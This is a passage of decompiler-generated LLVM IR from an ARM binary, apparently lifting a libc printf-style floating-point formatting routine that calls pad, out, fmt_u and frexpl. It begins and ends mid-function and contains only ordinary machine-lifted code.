  %v5_14d30 = inttoptr i32 %v0_14d30 to i8*
  br label %dec_label_pc_14d38

dec_label_pc_14d38:                               ; preds = %.thread69, %dec_label_pc_14cdc, %.thread76
  %v0_14ddc = phi i32 [ %v0_14cdc, %.thread76 ], [ %v0_14cdc, %.thread69 ], [ %v1_14cdc, %dec_label_pc_14cdc ]
  %stack_var_-688.2 = phi i32 [ %v0_14d34, %.thread76 ], [ 1, %.thread69 ], [ 1, %dec_label_pc_14cdc ]
  %stack_var_-684.2 = phi i8* [ %v5_14d30, %.thread76 ], [ getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_19eef.698, i32 0, i32 0), %.thread69 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_19eec.696, i32 0, i32 0), %dec_label_pc_14cdc ]
  store i32 2146435071, i32* %r2.global-to-local, align 4
  %tmp896 = bitcast i32 %v0_14ddc to float
  %tmp897 = call float @fabsf(float %tmp896)
  %v2_14d40 = bitcast float %tmp897 to i32
  store i32 %v2_14d40, i32* @r4, align 4
  %tmp898 = icmp ult i32 %v2_14d40, 2146435072
  br i1 %tmp898, label %dec_label_pc_14ddc, label %dec_label_pc_14d4c

dec_label_pc_14d4c:                               ; preds = %dec_label_pc_14d38
  store i32 ptrtoint ([4 x i8]* @global_var_19f00.704 to i32), i32* %ip.global-to-local, align 4
  %v1_14d54 = and i32 %v4_14794, 32
  store i32 %v1_14d54, i32* %r4.global-to-local, align 4
  %v2_14d54 = icmp eq i32 %v1_14d54, 0
  store i32 ptrtoint ([4 x i8]* @global_var_19f04.706 to i32), i32* @lr, align 4
  store i32 %v3_14cc4, i32* @r0, align 4
  store i32 %v3_14cc4, i32* @r2, align 4
  store i32 %v0_14ddc, i32* %r1.global-to-local, align 4
  store i32 %v0_14ddc, i32* %r3.global-to-local, align 4
  %.645 = select i1 %v2_14d54, i32 ptrtoint ([4 x i8]* @global_var_19f04.706 to i32), i32 ptrtoint ([4 x i8]* @global_var_19f00.704 to i32)
  store i32 %.645, i32* @r5, align 4
  %v0_14d74 = call i32 @__aeabi_dcmpeq()
  store i32 %v0_14d74, i32* %r0.global-to-local, align 4
  %v2_14d78 = icmp eq i32 %v0_14d74, 0
  br i1 %v2_14d78, label %dec_label_pc_14d80, label %bb569

dec_label_pc_14d80:                               ; preds = %dec_label_pc_14d4c
  store i32 ptrtoint ([4 x i8]* @global_var_19f0c.708 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19f08.710 to i32), i32* %r3.global-to-local, align 4
  %v0_14d88 = load i32, i32* %r4.global-to-local, align 4
  %v2_14d88 = icmp eq i32 %v0_14d88, 0
  br i1 %v2_14d88, label %bb568, label %.thread78

bb568:                                            ; preds = %dec_label_pc_14d80
  store i32 ptrtoint ([4 x i8]* @global_var_19f0c.708 to i32), i32* @r5, align 4
  br label %bb569

.thread78:                                        ; preds = %dec_label_pc_14d80
  store i32 ptrtoint ([4 x i8]* @global_var_19f08.710 to i32), i32* @r5, align 4
  br label %bb569

bb569:                                            ; preds = %bb568, %dec_label_pc_14d4c, %.thread78
  %v1_14d9c = add nsw i32 %stack_var_-688.2, 3
  store i32 %v1_14d9c, i32* @r4, align 4
  %v1_14da0 = and i32 %v4_14790, -65537
  store i32 %v1_14da0, i32* %ip.global-to-local, align 4
  store i32 %v1_14d9c, i32* %r3.global-to-local, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r1, align 4
  store i32 %v3_15b90, i32* %r2.global-to-local, align 4
  %v6_14db8 = call i32 @pad(i32 %v0_143d0, i32 32, i32 %v3_15b90, i32 %v1_14d9c, i32 %v1_14da0)
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v4_14dc0 = ptrtoint i8* %stack_var_-684.2 to i32
  store i32 %v4_14dc0, i32* @r1, align 4
  store i32 %stack_var_-688.2, i32* @r2, align 4
  %v2_14dc8 = call i32 @out(i32* %v1_15bf0)
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v0_14dd0 = load i32, i32* @r5, align 4
  store i32 %v0_14dd0, i32* @r1, align 4
  br label %dec_label_pc_15108

dec_label_pc_14ddc:                               ; preds = %dec_label_pc_14d38
  store i32 %v0_14ddc, i32* @r1, align 4
  store i32 %v2_14de0, i32* @r2, align 4
  store i32 %v3_14cc4, i32* @r0, align 4
  %v3_14de8 = call i32 @frexpl(i32 %v3_14cc4, i32 %v0_14ddc, i32 %v2_14de0)
  %v4_14de8 = sext i32 %v3_14de8 to i64
  %v3_14dec = bitcast i64 %v4_14de8 to double
  %v9_14df4 = fadd double %v3_14dec, %v3_14dec
  %v10_14df4 = fptrunc double %v9_14df4 to float
  %v11_14df4 = bitcast float %v10_14df4 to i32
  store i32 %v11_14df4, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 %v11_14df4, i32* @r6, align 4
  store i32 %v0_14ddc, i32* @r7, align 4
  %v0_14e08 = call i32 @__aeabi_dcmpeq()
  store i32 %v0_14e08, i32* %r0.global-to-local, align 4
  %v2_14e0c = icmp eq i32 %v0_14e08, 0
  br i1 %v2_14e0c, label %bb570, label %.thread80

bb570:                                            ; preds = %dec_label_pc_14ddc
  %v4_14e10 = load i8, i8* %stack_var_-52, align 1
  %v5_14e10 = sext i8 %v4_14e10 to i32
  %v2_14e14 = add nsw i32 %v5_14e10, -1
  store i32 %v2_14e14, i32* %r3.global-to-local, align 4
  %v6_14e18 = trunc i32 %v2_14e14 to i8
  store i8 %v6_14e18, i8* %stack_var_-52, align 1
  br label %.thread80

.thread80:                                        ; preds = %dec_label_pc_14ddc, %bb570
  %v1_14e20 = or i32 %v4_14794, 32
  store i32 %v1_14e20, i32* %r3.global-to-local, align 4
  %v7_14e24 = icmp eq i32 %v1_14e20, 97
  br i1 %v7_14e24, label %dec_label_pc_14e30, label %dec_label_pc_1513c

dec_label_pc_14e30:                               ; preds = %.thread80
  store i32 %v4_14794, i32* %ip.global-to-local, align 4
  %v1_14e34 = and i32 %v4_14794, 32
  %v2_14e34 = icmp eq i32 %v1_14e34, 0
  br i1 %v2_14e34, label %.thread81, label %bb571

.thread81:                                        ; preds = %dec_label_pc_14e30
  %v4_14e3c82 = ptrtoint i8* %stack_var_-708.5 to i32
  store i32 %v4_14e3c82, i32* %r0.global-to-local, align 4
  %v1_14e48.pre = load i32, i32* @lr, align 4
  br label %bb572

bb571:                                            ; preds = %dec_label_pc_14e30
  %v5_14e38 = ptrtoint i8* %stack_var_-684.2 to i32
  %v4_14e3c = ptrtoint i8* %stack_var_-708.5 to i32
  store i32 %v4_14e3c, i32* %r0.global-to-local, align 4
  %v2_14e40 = add i32 %v5_14e38, 9
  br label %bb572

bb572:                                            ; preds = %.thread81, %bb571
  %v1_14e48 = phi i32 [ %v1_14e48.pre, %.thread81 ], [ %v2_14e40, %bb571 ]
  %v1_15048 = phi i32 [ %v4_14e3c82, %.thread81 ], [ %v4_14e3c, %bb571 ]
  store i32 %stack_var_-688.2, i32* %r1.global-to-local, align 4
  %v6_14e48 = inttoptr i32 %v1_14e48 to i8*
  %stack_var_-684.3 = select i1 %v2_14e34, i8* %stack_var_-684.2, i8* %v6_14e48
  %v1_14e50 = add nsw i32 %stack_var_-688.2, 2
  store i32 %v1_14e50, i32* %fp.global-to-local, align 4
  %tmp899 = icmp ugt i32 %v1_15048, 11
  br i1 %tmp899, label %dec_label_pc_14ef8, label %dec_label_pc_14e58

dec_label_pc_14e58:                               ; preds = %bb572
  %v1_14e58 = sub i32 12, %v1_15048
  store i32 %v1_14e58, i32* @r4, align 4
  br i1 false, label %dec_label_pc_14ef8, label %dec_label_pc_14e78.preheader

dec_label_pc_14e78.preheader:                     ; preds = %dec_label_pc_14e58
  store i32 0, i32* @r8, align 4
  store i32 1075838976, i32* @sb, align 4
  store i32 -1, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1075838976, i32* %r1.global-to-local, align 4
  store i32 1076887552, i32* %r3.global-to-local, align 4
  %v4_14e94 = ptrtoint i8* %stack_var_-684.3 to i32
  store i32 %v4_14e94, i32* %r2.global-to-local, align 4
  %v2_14e98 = load i8, i8* %stack_var_-684.3, align 1
  %v3_14e98 = zext i8 %v2_14e98 to i32
  store i32 %v3_14e98, i32* %r3.global-to-local, align 4
  %v7_14e9c = icmp eq i8 %v2_14e98, 45
  %v0_14ea4 = load i32, i32* @r6, align 4
  br i1 %v7_14e9c, label %dec_label_pc_14ea4, label %dec_label_pc_14ed0

dec_label_pc_14ea4:                               ; preds = %dec_label_pc_14e78.preheader
  store i32 %v0_14ea4, i32* @r0, align 4
  %v0_14ea8 = load i32, i32* @r7, align 4
  %v1_14ea8 = sub i32 0, %v0_14ea8
  store i32 %v1_14ea8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1075838976, i32* %r3.global-to-local, align 4
  %v5_14eb4 = call i32 @__aeabi_dsub(i32 %v0_14ea4, i32 %v1_14ea8, i32 0, i32 1075838976)
  %v6_14eb4 = sext i32 %v5_14eb4 to i64
  %v7_14eb4 = bitcast i64 %v6_14eb4 to double
  %v0_14eb8 = load i32, i32* @r8, align 4
  %v1_14eb8 = sext i32 %v0_14eb8 to i64
  store i32 %v0_14eb8, i32* %r2.global-to-local, align 4
  %v0_14ebc = load i32, i32* @sb, align 4
  store i32 %v0_14ebc, i32* %r3.global-to-local, align 4
  %v8_14ec0 = bitcast i64 %v1_14eb8 to double
  %v9_14ec0 = fadd double %v7_14eb4, %v8_14ec0
  %v10_14ec0 = fptrunc double %v9_14ec0 to float
  %v11_14ec0 = bitcast float %v10_14ec0 to i32
  store i32 %v11_14ec0, i32* %r0.global-to-local, align 4
  store i32 %v11_14ec0, i32* @r6, align 4
  store i32 %v0_14ea8, i32* @r7, align 4
  br label %dec_label_pc_14ef8

dec_label_pc_14ed0:                               ; preds = %dec_label_pc_14e78.preheader
  %v1_14ed0 = sext i32 %v0_14ea4 to i64
  %v2_14ed0 = bitcast i64 %v1_14ed0 to double
  %v0_14ed4 = load i32, i32* @r7, align 4
  store i32 %v0_14ed4, i32* %r1.global-to-local, align 4
  %v9_14ee0 = fadd double %v2_14ed0, 0.000000e+00
  %v10_14ee0 = fptrunc double %v9_14ee0 to float
  %v11_14ee0 = bitcast float %v10_14ee0 to i32
  store i32 %v11_14ee0, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1075838976, i32* %r3.global-to-local, align 4
  %v5_14eec = call i32 @__aeabi_dsub(i32 %v11_14ee0, i32 %v0_14ed4, i32 0, i32 1075838976)
  store i32 %v5_14eec, i32* %r0.global-to-local, align 4
  store i32 %v5_14eec, i32* @r6, align 4
  store i32 %v0_14ed4, i32* @r7, align 4
  br label %dec_label_pc_14ef8

dec_label_pc_14ef8:                               ; preds = %dec_label_pc_14e58, %bb572, %dec_label_pc_14ea4, %dec_label_pc_14ed0
  %v3_14ef8 = load i8, i8* %stack_var_-52, align 1
  %v4_14ef8 = sext i8 %v3_14ef8 to i32
  %v1_14efc = icmp slt i8 %v3_14ef8, 0
  br i1 %v1_14efc, label %bb573, label %bb574

bb573:                                            ; preds = %dec_label_pc_14ef8
  %v4_14f00 = sub nsw i32 0, %v4_14ef8
  br label %bb574

bb574:                                            ; preds = %dec_label_pc_14ef8, %bb573
  %storemerge887 = phi i32 [ %v4_14f00, %bb573 ], [ %v4_14ef8, %dec_label_pc_14ef8 ]
  %v0_14f0c = phi i32 [ %v4_14f00, %bb573 ], [ %v4_14ef8, %dec_label_pc_14ef8 ]
  store i32 %storemerge887, i32* %r0.global-to-local, align 4
  %v3_14f04 = ashr i32 %v0_14f0c, 31
  store i32 %v3_14f04, i32* %r1.global-to-local, align 4
  store i32 %v2_143ac, i32* %r2.global-to-local, align 4
  %v3_14f0c = call i32 @fmt_u(i32 %v0_14f0c, i32 %v3_14f04, i32 %v2_143ac)
  store i32 %v3_14f0c, i32* %r0.global-to-local, align 4
  %v9_14f14 = icmp eq i32 %v3_14f0c, %v2_143ac
  %v3_14f20 = load i8, i8* %stack_var_-52, align 1
  %v4_14f20 = sext i8 %v3_14f20 to i32
  store i32 %v4_14f20, i32* %r3.global-to-local, align 4
  store i32 %v4_14794, i32* @lr, align 4
  br i1 %v9_14f14, label %bb575, label %.thread89

bb575:                                            ; preds = %bb574
  store i32 %v2_143a4, i32* %ip.global-to-local, align 4
  store i32 %v2_14f2c, i32* %r0.global-to-local, align 4
  br label %.thread89

.thread89:                                        ; preds = %bb574, %bb575
  %v2_14f44 = phi i32 [ %v2_14f2c, %bb575 ], [ %v3_14f0c, %bb574 ]
  %v1_14f30 = icmp slt i8 %v3_14f20, 0
  %v1_14f34 = add i32 %v2_14f44, -1
  store i32 %v1_14f34, i32* %r1.global-to-local, align 4
  %.646 = select i1 %v1_14f30, i32 45, i32 43
  %tmp878 = ashr i8 %v3_14f20, 7
  %tmp879 = and i8 %tmp878, 2
  %tmp880 = add nuw nsw i8 %tmp879, 43
  store i32 %.646, i32* %r3.global-to-local, align 4
  %v1_14f40 = add nsw i32 %v4_14794, 15
  store i32 %v1_14f40, i32* %r2.global-to-local, align 4
  %v4_14f44 = inttoptr i32 %v1_14f34 to i8*
  store i8 %tmp880, i8* %v4_14f44, align 1
  %v0_14f48 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f48 = trunc i32 %v0_14f48 to i8
  %v2_14f48 = load i32, i32* %r1.global-to-local, align 4
  %v3_14f48 = add i32 %v2_14f48, -1
  %v4_14f48 = inttoptr i32 %v3_14f48 to i8*
  store i8 %v1_14f48, i8* %v4_14f48, align 1
  store i32 %v4_14790, i32* %r0.global-to-local, align 4
  %v0_14f50 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f50 = add i32 %v0_14f50, -1
  store i32 %v1_14f50, i32* %r1.global-to-local, align 4
  %v0_14f5c = load i32, i32* @lr, align 4
  %v1_14f5c = and i32 %v0_14f5c, 32
  store i32 %v1_14f5c, i32* %r8.global-to-local, align 4
  store i32 %v2_143a8, i32* @r5, align 4
  store i32 46, i32* @sb, align 4
  %v1_14f68 = and i32 %v4_14790, 8
  store i32 %v1_14f68, i32* %r4.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  %tmp581 = icmp slt i32 %v1_15048, 1
  br label %dec_label_pc_14f70

dec_label_pc_14f70:                               ; preds = %dec_label_pc_15000.dec_label_pc_14f70_crit_edge, %.thread89
  %v2_14f88 = phi i32 [ %v2_14f88.pre, %dec_label_pc_15000.dec_label_pc_14f70_crit_edge ], [ %v2_143a8, %.thread89 ]
  %v1_14f84 = phi i32 [ %v1_14f84.pre, %dec_label_pc_15000.dec_label_pc_14f70_crit_edge ], [ %v1_14f5c, %.thread89 ]
  %v0_14f74 = load i32, i32* @r6, align 4
  %v1_14f78 = sext i32 %v0_14f74 to i64
  %v2_14f78 = bitcast i64 %v1_14f78 to double
  %v3_14f78 = fptosi double %v2_14f78 to i32
  store i32 %v3_14f78, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a0e4.689 to i32), i32* %r1.global-to-local, align 4
  %v2_14f80 = add i32 %v3_14f78, ptrtoint (i32* @global_var_1a0e4.689 to i32)
  %v3_14f80 = inttoptr i32 %v2_14f80 to i8*
  %v4_14f80 = load i8, i8* %v3_14f80, align 1
  %v6_14f80 = zext i8 %v4_14f80 to i32
  %v2_14f84 = or i32 %v6_14f80, %v1_14f84
  %v1_14f88 = trunc i32 %v2_14f84 to i8
  %v3_14f88 = inttoptr i32 %v2_14f88 to i8*
  store i8 %v1_14f88, i8* %v3_14f88, align 1
  %v4_14f88 = load i32, i32* @r5, align 4
  %v5_14f88 = add i32 %v4_14f88, 1
  store i32 %v5_14f88, i32* @r5, align 4
  %v0_14f90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14f90, i32* %r2.global-to-local, align 4
  %v0_14f94 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14f94, i32* %r3.global-to-local, align 4
  %v0_14f98 = load i32, i32* @r6, align 4
  store i32 %v0_14f98, i32* @r0, align 4
  %v0_14f9c = load i32, i32* @r7, align 4
  store i32 %v0_14f9c, i32* %r1.global-to-local, align 4
  %v4_14fa0 = call i32 @__aeabi_dsub(i32 %v0_14f98, i32 %v0_14f9c, i32 %v0_14f90, i32 %v0_14f94)
  %v5_14fa0 = sext i32 %v4_14fa0 to i64
  %v3_14fac = bitcast i64 %v5_14fa0 to double
  %v9_14fac = fmul double %v3_14fac, 0.000000e+00
  %v10_14fac = fptrunc double %v9_14fac to float
  %v11_14fac = bitcast float %v10_14fac to i32
  store i32 %v11_14fac, i32* @r0, align 4
  store i32 %v2_143a8, i32* %r2.global-to-local, align 4
  %v1_14fb4 = load i32, i32* @r5, align 4
  %v2_14fb4 = sub i32 %v1_14fb4, %v2_143a8
  store i32 %v2_14fb4, i32* %r3.global-to-local, align 4
  %v7_14fb8 = icmp eq i32 %v2_14fb4, 1
  store i32 %v11_14fac, i32* @r6, align 4
  store i32 %v0_14f9c, i32* @r7, align 4
  br i1 %v7_14fb8, label %dec_label_pc_14fc8, label %dec_label_pc_15000

dec_label_pc_14fc8:                               ; preds = %dec_label_pc_14f70
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v0_14fd0 = call i32 @__aeabi_dcmpeq()
  store i32 %v0_14fd0, i32* %r0.global-to-local, align 4
  store i32 %v1_15048, i32* %ip.global-to-local, align 4
  %v2_14fd8 = icmp eq i32 %v0_14fd0, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v2_14fd8, label %bb579, label %bb580

bb579:                                            ; preds = %dec_label_pc_14fc8
  %v1_14fe0 = load i32, i32* @sl, align 4
  store i32 %v1_14fe0, i32* %r3.global-to-local, align 4
  br label %bb580

bb580:                                            ; preds = %dec_label_pc_14fc8, %bb579
  %v5_14fe8 = phi i32 [ 0, %dec_label_pc_14fc8 ], [ %v1_14fe0, %bb579 ]
  br i1 %tmp581, label %bb583, label %bb582

bb582:                                            ; preds = %bb580
  %v6_14fe8 = or i32 %v5_14fe8, 1
  store i32 %v6_14fe8, i32* %r3.global-to-local, align 4
  br label %bb583

bb583:                                            ; preds = %bb580, %bb582
  %v0_14fec = phi i32 [ %v5_14fe8, %bb580 ], [ %v6_14fe8, %bb582 ]
  %v1_14fec = urem i32 %v0_14fec, 2
  %v2_14fec = icmp eq i32 %v1_14fec, 0
  br i1 %v2_14fec, label %dec_label_pc_14ff4, label %dec_label_pc_14ffc

dec_label_pc_14ff4:                               ; preds = %bb583
  %v0_14ff4 = load i32, i32* %r4.global-to-local, align 4
  %v2_14ff4 = icmp eq i32 %v0_14ff4, 0
  br i1 %v2_14ff4, label %dec_label_pc_15000, label %dec_label_pc_14ffc

dec_label_pc_14ffc:                               ; preds = %bb583, %dec_label_pc_14ff4
  %v0_14ffc = load i32, i32* @sb, align 4
  %v1_14ffc = trunc i32 %v0_14ffc to i8
  %v2_14ffc = load i32, i32* @r5, align 4
  %v3_14ffc = inttoptr i32 %v2_14ffc to i8*
  store i8 %v1_14ffc, i8* %v3_14ffc, align 1
  %v4_14ffc = load i32, i32* @r5, align 4
  %v5_14ffc = add i32 %v4_14ffc, 1
  store i32 %v5_14ffc, i32* @r5, align 4
  br label %dec_label_pc_15000

dec_label_pc_15000:                               ; preds = %dec_label_pc_14f70, %dec_label_pc_14ff4, %dec_label_pc_14ffc
  %v0_15000 = load i32, i32* @r6, align 4
  store i32 %v0_15000, i32* @r0, align 4
  %v0_15004 = load i32, i32* @r7, align 4
  store i32 %v0_15004, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15010 = call i32 @__aeabi_dcmpeq()
  store i32 %v0_15010, i32* %r0.global-to-local, align 4
  %v2_15014 = icmp eq i32 %v0_15010, 0
  br i1 %v2_15014, label %dec_label_pc_15000.dec_label_pc_14f70_crit_edge, label %dec_label_pc_1501c

dec_label_pc_15000.dec_label_pc_14f70_crit_edge:  ; preds = %dec_label_pc_15000
  %v1_14f84.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_14f88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14f70

dec_label_pc_1501c:                               ; preds = %dec_label_pc_15000
  store i32 %v1_15048, i32* @lr, align 4
  %v2_15020 = icmp eq i8* %stack_var_-708.5, null
  br i1 %v2_15020, label %dec_label_pc_1501c.dec_label_pc_15054_crit_edge, label %dec_label_pc_15028

dec_label_pc_1501c.dec_label_pc_15054_crit_edge:  ; preds = %dec_label_pc_1501c
  %v0_1505c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15054

dec_label_pc_15028:                               ; preds = %dec_label_pc_1501c
  store i32 %v2_143a8, i32* %r0.global-to-local, align 4
  %v1_1502c = load i32, i32* @r5, align 4
  %v2_1502c = sub i32 %v1_1502c, %v2_143a8
  %v1_15030 = add i32 %v2_1502c, -2
  store i32 %v1_15030, i32* %r3.global-to-local, align 4
  %v2_15034 = sub i32 %v1_15030, %v1_15048
  %v4_15034 = xor i32 %v1_15030, %v1_15048
  %v5_15034 = xor i32 %v2_15034, %v1_15030
  %v6_15034 = and i32 %v5_15034, %v4_15034
  %v7_15034 = icmp slt i32 %v6_15034, 0
  %v8_15034 = icmp slt i32 %v2_15034, 0
  %v2_15038 = xor i1 %v8_15034, %v7_15034
  br i1 %v2_15038, label %dec_label_pc_1503c, label %dec_label_pc_15054

dec_label_pc_1503c:                               ; preds = %dec_label_pc_15028
  store i32 %v2_143a4, i32* %r1.global-to-local, align 4
  store i32 %v2_15040, i32* %r3.global-to-local, align 4
  store i32 %v1_14f50, i32* %r2.global-to-local, align 4
  %v2_15048 = add i32 %v1_15048, %v2_15040
  br label %dec_label_pc_15064

dec_label_pc_15054:                               ; preds = %dec_label_pc_1501c.dec_label_pc_15054_crit_edge, %dec_label_pc_15028
  %v0_1505c = phi i32 [ %v0_1505c.pre, %dec_label_pc_1501c.dec_label_pc_15054_crit_edge ], [ %v1_1502c, %dec_label_pc_15028 ]
  store i32 %v2_143c4, i32* %ip.global-to-local, align 4
  store i32 %v1_14f50, i32* @lr, align 4
  %v2_1505c = add i32 %v0_1505c, %v2_143c4
  br label %dec_label_pc_15064

dec_label_pc_15064:                               ; preds = %dec_label_pc_1503c, %dec_label_pc_15054
  %storemerge30 = phi i32 [ %v2_1505c, %dec_label_pc_15054 ], [ %v2_15048, %dec_label_pc_1503c ]
  %storemerge22 = sub i32 %storemerge30, %v1_14f50
  store i32 %storemerge22, i32* @r7, align 4
  store i32 %v4_14790, i32* %ip.global-to-local, align 4
  %v1_15068 = load i32, i32* %fp.global-to-local, align 4
  %v2_15068 = add i32 %v1_15068, %storemerge22
  store i32 %v2_15068, i32* @r4, align 4
  store i32 %v2_15068, i32* %r3.global-to-local, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r1, align 4
  store i32 %v3_15b90, i32* %r2.global-to-local, align 4
  %v6_15080 = call i32 @pad(i32 %v0_143d0, i32 32, i32 %v3_15b90, i32 %v2_15068, i32 %v4_14790)
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v4_15088 = ptrtoint i8* %stack_var_-684.3 to i32
  store i32 %v4_15088, i32* @r1, align 4
  %v0_1508c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1508c, i32* @r2, align 4
  %v2_15090 = call i32 @out(i32* %v1_15bf0)
  %v1_15098 = load i32, i32* @r5, align 4
  %v2_15098 = sub i32 %v1_15098, %v2_143a8
  store i32 %v2_15098, i32* @r5, align 4
  store i32 %v4_14790, i32* @lr, align 4
  %v0_150a0 = load i32, i32* @r4, align 4
  store i32 %v0_150a0, i32* %r3.global-to-local, align 4
  %v1_150a4 = xor i32 %v4_14790, 65536
  store i32 %v1_150a4, i32* %ip.global-to-local, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 48, i32* @r1, align 4
  store i32 %v3_15b90, i32* %r2.global-to-local, align 4
  %v6_150b8 = call i32 @pad(i32 %v0_143d0, i32 48, i32 %v3_15b90, i32 %v0_150a0, i32 %v1_150a4)
  %v2_150c4 = sub i32 %v2_143ac, %v1_14f50
  store i32 %v2_150c4, i32* @r6, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 %v2_143a8, i32* @r1, align 4
  %v0_150d4 = load i32, i32* @r5, align 4
  store i32 %v0_150d4, i32* @r2, align 4
  %v2_150d8 = call i32 @out(i32* %v1_15bf0)
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_150e0 = load i32, i32* @r6, align 4
  %v1_150e0 = load i32, i32* @r7, align 4
  %v2_150e0 = sub i32 %v1_150e0, %v0_150e0
  %v0_150e4 = load i32, i32* @r5, align 4
  %v2_150e4 = sub i32 %v2_150e0, %v0_150e4
  store i32 %v2_150e4, i32* %r2.global-to-local, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 48, i32* @r1, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_150f8 = call i32 @pad(i32 %v0_143d0, i32 48, i32 %v2_150e4, i32 0, i32 0)
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 %v1_14f50, i32* @r1, align 4
  %v0_15104 = load i32, i32* @r6, align 4
  br label %dec_label_pc_15108

dec_label_pc_15108:                               ; preds = %bb569, %dec_label_pc_15064
  %stack_var_-692.1 = phi i32 [ %stack_var_-692.0, %bb569 ], [ %v1_14f50, %dec_label_pc_15064 ]
  %storemerge20 = phi i32 [ 3, %bb569 ], [ %v0_15104, %dec_label_pc_15064 ]
  store i32 %storemerge20, i32* @r2, align 4
  %v2_15108 = call i32 @out(i32* %v1_15bf0)
  store i32 %v2_15108, i32* %r0.global-to-local, align 4
  store i32 %v4_14790, i32* %r2.global-to-local, align 4
  %v0_15120.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15114

dec_label_pc_15114:                               ; preds = %dec_label_pc_14cb4, %dec_label_pc_15108
  %v0_15120 = phi i32 [ %v0_15120386, %dec_label_pc_14cb4 ], [ %v0_15120.pre, %dec_label_pc_15108 ]
  %stack_var_-692.2 = phi i32 [ %stack_var_-692.0, %dec_label_pc_14cb4 ], [ %stack_var_-692.1, %dec_label_pc_15108 ]
  %storemerge21 = xor i32 %v4_14790, 8192
  store i32 %storemerge21, i32* %ip.global-to-local, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r1, align 4
  store i32 %v3_15b90, i32* %r2.global-to-local, align 4
  store i32 %v0_15120, i32* %r3.global-to-local, align 4
  %v6_15128 = call i32 @pad(i32 %v0_143d0, i32 32, i32 %v3_15b90, i32 %v0_15120, i32 %storemerge21)
  store i32 %v6_15128, i32* %r0.global-to-local, align 4
  store i32 %v3_15b90, i32* @r5, align 4
  %v1_15130 = load i32, i32* @r4, align 4
  %v2_15130 = sub i32 %v3_15b90, %v1_15130
  %v4_15130 = xor i32 %v1_15130, %v3_15b90
  %v5_15130 = xor i32 %v2_15130, %v3_15b90
  %v6_15130 = and i32 %v5_15130, %v4_15130
  %v7_15130 = icmp slt i32 %v6_15130, 0
  %v8_15130 = icmp slt i32 %v2_15130, 0
  %v2_15134 = xor i1 %v8_15130, %v7_15130
  br i1 %v2_15134, label %bb584, label %dec_label_pc_143e4

bb584:                                            ; preds = %dec_label_pc_15114
  store i32 %v1_15130, i32* @r5, align 4
  br label %dec_label_pc_143e4

dec_label_pc_1513c:                               ; preds = %.thread80
  %v4_1513c = ptrtoint i8* %stack_var_-708.5 to i32
  %v1_15140 = icmp slt i8* %stack_var_-708.5, null
  br i1 %v1_15140, label %bb585, label %bb586

bb585:                                            ; preds = %dec_label_pc_1513c
  br label %bb586

bb586:                                            ; preds = %dec_label_pc_1513c, %bb585
  %storemerge886 = phi i32 [ 6, %bb585 ], [ %v4_1513c, %dec_label_pc_1513c ]
  %v1_1543c = phi i32 [ 6, %bb585 ], [ %v4_1513c, %dec_label_pc_1513c ]
  store i32 %storemerge886, i32* %r3.global-to-local, align 4
  br i1 %v2_14e0c, label %dec_label_pc_15154, label %dec_label_pc_1517cthread-pre-split

dec_label_pc_15154:                               ; preds = %bb586
  %v0_15154 = load i32, i32* @r6, align 4
  %v1_15154 = sext i32 %v0_15154 to i64
  %v0_15158 = load i32, i32* @r7, align 4
  store i32 %v0_15158, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_15164 = bitcast i64 %v1_15154 to double
  %v9_15164 = fmul double %v3_15164, 0.000000e+00
  %v10_15164 = fptrunc double %v9_15164 to float
  %v11_15164 = bitcast float %v10_15164 to i32
  store i32 %v11_15164, i32* %r0.global-to-local, align 4
  %v3_15168 = load i8, i8* %stack_var_-52, align 1
  %v4_15168 = sext i8 %v3_15168 to i32
  %v1_1516c = add nsw i32 %v4_15168, -28
  store i32 %v1_1516c, i32* %r3.global-to-local, align 4
  %v5_15170 = trunc i32 %v1_1516c to i8
  store i8 %v5_15170, i8* %stack_var_-52, align 1
  store i32 %v11_15164, i32* @r6, align 4
  br label %dec_label_pc_1517c

dec_label_pc_1517cthread-pre-split:               ; preds = %bb586
  %v3_1517c.pr = load i8, i8* %stack_var_-52, align 1
  br label %dec_label_pc_1517c

dec_label_pc_1517c:                               ; preds = %dec_label_pc_1517cthread-pre-split, %dec_label_pc_15154
  %v3_15198295 = phi i32 [ %v0_14e08, %dec_label_pc_1517cthread-pre-split ], [ %v11_15164, %dec_label_pc_15154 ]
